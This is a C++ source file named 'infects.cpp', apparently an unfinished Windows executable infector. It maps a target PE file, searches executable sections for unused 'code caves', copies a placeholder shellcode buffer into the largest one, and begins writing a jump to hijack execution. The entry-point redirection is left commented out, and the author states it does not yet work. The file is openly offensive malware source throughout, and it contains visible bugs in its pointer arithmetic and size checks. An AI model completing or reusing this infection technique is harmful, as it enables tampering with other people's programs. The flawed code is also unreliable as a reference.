#include <iostream>
#include <stdio.h>
#include <windows.h>

using namespace std;
//
// Author : shmuel.yr
// infects.cpp : Defines the entry point for the console application.
// Note : This project is under building.. Meanwhile, it will not work
//


int main(int ac, char **av) {
	if(ac < 2) {
		cout << "usage : " << av[0] << " <name_of_file>\n";
		return 1;
	}
	char *shellcode = "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff";
	HANDLE hFile = CreateFile(av[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(!hFile) {
		cout << "CreareFile error.";
		return 1;
	}
	HANDLE hFileMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, 0);
	if(!hFileMap) {
		cout << "CreateFileMapping error.";
		return 1;
	}
	char *fileContant = (char *)MapViewOfFile(hFileMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
	if(!fileContant) {
		cout << "MapViewOfFile error.";
		return 1;
	}
	IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER*)fileContant;
	if(dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		cout << "DOS header is not valid!";
		return 1;
	}
	IMAGE_NT_HEADERS *ntHeader = (IMAGE_NT_HEADERS*)(fileContant + dosHeader->e_lfanew);
	if(ntHeader->Signature != IMAGE_NT_SIGNATURE) {
		cout << "NT header is not valid!";
		return 1;
	}
	
	IMAGE_SECTION_HEADER *section = (IMAGE_SECTION_HEADER*)((char*)ntHeader + sizeof(IMAGE_NT_HEADERS));
	IMAGE_SECTION_HEADER *caveSection; // section structor of cave
	char *mem = 0; // addr of cave - the bigger
	int maxCaveSize = 0; // size for cave

	for(int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++, section++) {
		if(section->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
			cout << "[+] Section : " << section->Name << " is executable, look for unusage space..\n";;	
			char *oldMem = fileContant + section->PointerToRawData;
			
			for(int j = 0; j < section->SizeOfRawData; j++) { //this section is executeable.
				int caveSize = 0;
				
				while(*oldMem == 0){
					oldMem++, j++, caveSize++;
				}
			
				if (caveSize > section->SizeOfRawData) //check overflow to the next section.
					caveSize -= section->SizeOfRawData;	
		
				if(caveSize > maxCaveSize) { //to maximize the size.
					mem = oldMem;
					maxCaveSize = caveSize;
					caveSection = section;
				}
		
				oldMem++;
			}
			mem = mem - fileContant - maxCaveSize;
			
			if(maxCaveSize > 0) {
				cout << "\t[+] Founded " << maxCaveSize << "byte in this section at offset : 0x" << hex << mem << "\n";
				
			} else{
				cout << "\t[-] Not Found..\n";
			}
		}
	}
	
	cout << "[+] As summerry,  the max mem founded at 0x"  << mem << " with size : 0x" << maxCaveSize << "(" << dec << maxCaveSize << ") byte. \n";
	
	// take a safe distance from entry cave - 4 byte
	mem += 4;
	maxCaveSize -= 4;
	
	if(maxCaveSize < sizeof(shellcode)) { // check for overflow.
		cout << "[-] your shellcode bigger then cave size.";
		return 1;
	}
	
	// now copy the cave.
	cout << "[+] Now copy the shellcode to the cave..\n";
	memcpy(mem + (int)fileContant, shellcode, 20);
	cout << "[+] Generated JMP instruction..\n";
	cout << "\t * OEP is at : " << hex << ntHeader->OptionalHeader.AddressOfEntryPoint << endl;
	cout << "\t * fake EP is at : " << mem - caveSection->PointerToRawData + caveSection->VirtualAddress << " + ImgBase" << endl;
	//int d = ntHeader->OptionalHeader.AddressOfEntryPoint - (mem - caveSection->PointerToRawData + caveSection->VirtualAddress);
	
	// calc virtual addr for our cave
	
	
	
	//cout << "[+] dist is : " << d << endl;
	mem += 20;
	*(mem++) = 0xe9; // jmp near
	//*(DWORD*)mem = (ULONG32)d;
	//cout << hex << ntHeader->OptionalHeader.AddressOfEntryPoint << endl;
	//cout << "[+] Changeing EP to the cave addr..\n";
	//ntHeader->OptionalHeader.AddressOfEntryPoint = mem - fileContant;
	
	UnmapViewOfFile(fileContant);
	CloseHandle(hFileMap);
	CloseHandle(hFile);
	return 0;
}
